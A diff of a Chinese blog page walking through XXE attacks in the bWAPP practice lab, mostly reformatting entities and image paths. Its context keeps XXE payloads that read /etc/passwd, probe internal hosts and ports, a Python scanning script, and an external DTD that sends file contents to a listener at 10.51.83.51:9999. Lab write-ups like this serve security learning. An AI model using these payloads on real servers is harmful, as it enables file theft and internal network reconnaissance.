@@ -505,20 +505,17 @@
 <p>接下来2个月就在各种靶场度过，打好基本功再来实战吧。</p>
 <p>安装bwapp的虚拟机： <a target="_blank" rel="noopener" href="https://sourceforge.net/projects/bwapp/files/bee-box/bee-box_v1.6.7z/download">https://sourceforge.net/projects/bwapp/files/bee-box/bee-box_v1.6.7z/download</a> ，下载解压用vmware打开里面的vmx文件即可。</p>
 <p>选择NAT模式，不选也可以，反正让现实的主机能访问到即可</p>
-<p>开机之后界面就有bwapp-start图标了，用bee &#x2F;bug 账号密码登陆然后选择漏洞开始测试。bwapp的xxe都是有回显的，比较初级，拿来练手再合适不过。</p>
+<p>开机之后界面就有bwapp-start图标了，用bee /bug 账号密码登陆然后选择漏洞开始测试。bwapp的xxe都是有回显的，比较初级，拿来练手再合适不过。</p>
 <span id="more"></span>
-
-
-
 <h2 id="0x01-low等级"><a href="#0x01-low等级" class="headerlink" title="0x01 (low等级)"></a>0x01 (low等级)</h2><p>原理剖析：</p>
-<p><img src="/../images/1650774373481.png" alt="1650774373481"></p>
+<p><img src="images/1650774373481.png" alt="1650774373481"></p>
 <p>body变量可控，并且作为simplexml_load_string的参数。此函数会将一个符合规范的，良好的xml文档变成一个类对象，例子：</p>
-<p><img src="/../images/1650774451891.png" alt="1650774451891"></p>
+<p><img src="images/1650774451891.png" alt="1650774451891"></p>
 <p>note1111应当是文档的根节点，其下的所有子节点经过函数之后就会变成类对象的属性，子节点的值就是对象属性的值啦。</p>
 <p>可以看到代码是没有对我们传入的body进行任何过滤的，所以我们可以传入恶意的xml。</p>
-<p>但是由于<img src="/../images/1650774560691.png" alt="1650774560691"></p>
-<p>login跟secret都不能为空，这两个变量来自于我们的xml。所以我们的payload构造一定要有这两个元素，然后才可以成功注入，否侧就会报错<img src="/../images/1650774646995.png" alt="1650774646995"></p>
-<p>1)burp抓包打开，构造如下payload用来读取&#x2F;etc&#x2F;passwd文件</p>
+<p>但是由于<img src="images/1650774560691.png" alt="1650774560691"></p>
+<p>login跟secret都不能为空，这两个变量来自于我们的xml。所以我们的payload构造一定要有这两个元素，然后才可以成功注入，否侧就会报错<img src="images/1650774646995.png" alt="1650774646995"></p>
+<p>1)burp抓包打开，构造如下payload用来读取/etc/passwd文件</p>
 <pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
 &lt;!DOCTYPE note [
         &lt;!ENTITY a SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
@@ -532,8 +529,7 @@
  &lt;&#x2F;secret&gt;
 &lt;&#x2F;note&gt;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/../images/1650773770056.png" alt="1650773770056"></p>
+<p><img src="images/1650773770056.png" alt="1650773770056"></p>
 <p>2)内网主机探测,ip地址是要测试的内网主机的地址</p>
 <pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
 &lt;!DOCTYPE note [
@@ -547,9 +543,8 @@
    test
  &lt;&#x2F;secret&gt;
 &lt;&#x2F;note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>存活主机的回答，这里不清楚解析错误的原因是什么，猜测是由于不能引用包含尖括号等可能引起dtd解析错误的东西<img src="/../images/1650774054168.png" alt="1650774054168"></p>
-<p>关机主机的回答,应该是No route to host in <img src="/../images/1650774076754.png" alt="1650774076754"></p>
+<p>存活主机的回答，这里不清楚解析错误的原因是什么，猜测是由于不能引用包含尖括号等可能引起dtd解析错误的东西<img src="images/1650774054168.png" alt="1650774054168"></p>
+<p>关机主机的回答,应该是No route to host in <img src="images/1650774076754.png" alt="1650774076754"></p>
 <p>3）发现了内网中存活的主机之后，进行端口探测</p>
 <pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
 &lt;!DOCTYPE note [
@@ -563,10 +558,9 @@
    test
  &lt;&#x2F;secret&gt;
 &lt;&#x2F;note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>端口未开放，未开放会显示连接被拒绝。<img src="/../images/1650774796547.png" alt="1650774796547"></p>
-<p>端口开放<img src="/../images/1650774807169.png" alt="1650774807169"></p>
-<p>又解析错误&#x3D; &#x3D;</p>
+<p>端口未开放，未开放会显示连接被拒绝。<img src="images/1650774796547.png" alt="1650774796547"></p>
+<p>端口开放<img src="images/1650774807169.png" alt="1650774807169"></p>
+<p>又解析错误= =</p>
 <p>来两个探测脚本实例，来自开头的学习链接。</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">import requests
 import base64
@@ -601,7 +595,6 @@ for i in range(1, 255):
         build_xml(string)
     except:
         continue<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <h2 id="0x02-medium-中级"><a href="#0x02-medium-中级" class="headerlink" title="0x02 medium 中级"></a>0x02 medium 中级</h2><p>emm，源代码都是一样的，但是根据条件等级进入不同语句。中级这里是接收session中的login，所以我们将注入语句写在secret就行</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
 include(&quot;security.php&quot;);
@@ -661,11 +654,9 @@ echo $message;
 
 $link-&gt;close();
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>但是发现代码输出的是message，但是message跟我们能注入的secret参数无关，我们采用盲注的手法吧。首先构造我们的外部dtd文件</p>
 <pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
 &lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;10.51.83.51:9999?p&#x3D;%file;&#39;&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <p>然后burp抓包，向存在xxe漏洞的服务器发送如下payload</p>
 <pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encode&#x3D;&quot;utf-8&quot;?&gt;
 &lt;!DOCTYPE ANY [
@@ -677,7 +668,6 @@ $link-&gt;close();
 123
 &lt;&#x2F;secret&gt;
 &lt;&#x2F;note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>理想很丰满，现实很骨感，经过长时间的尝试，我放弃了，虚拟机自带的配置似乎有问题导致有网络的超时，这一点从键盘居然不是国际标准按键表就可看出，q对应我们平常的a……,但是思路是对的就行</p>
 
                 
@@ -932,7 +922,7 @@ $link-&gt;close();
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            C&#x2F;C++语言实现线性表的顺序存储结构，附带 增 删 改 查。不要问为什么c跟c++混一起，书上的引用也是c++的，所以说不要拘泥于语言啦
+                            C/C++语言实现线性表的顺序存储结构，附带 增 删 改 查。不要问为什么c跟c++混一起，书上的引用也是c++的，所以说不要拘泥于语言啦
                         
                     </div>
                     <div class="publish-info">
@@ -1063,7 +1053,7 @@ $link-&gt;close();
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            headingSelector: 'h2, h3, h4,h5'
         });
 
         // modify the toc link href to support Chinese.
@@ -1075,7 +1065,7 @@ $link-&gt;close();
 
         // modify the heading title id to support Chinese.
         i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
+        $('#articleContent').children('h2, h3, h4,h5').each(function () {
             $(this).attr('id', tocHeading + (++i));
         });
 
@@ -1204,7 +1194,7 @@ $link-&gt;close();
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">267.7k</span>
+                        class="white-color">259.5k</span>
             
             
             
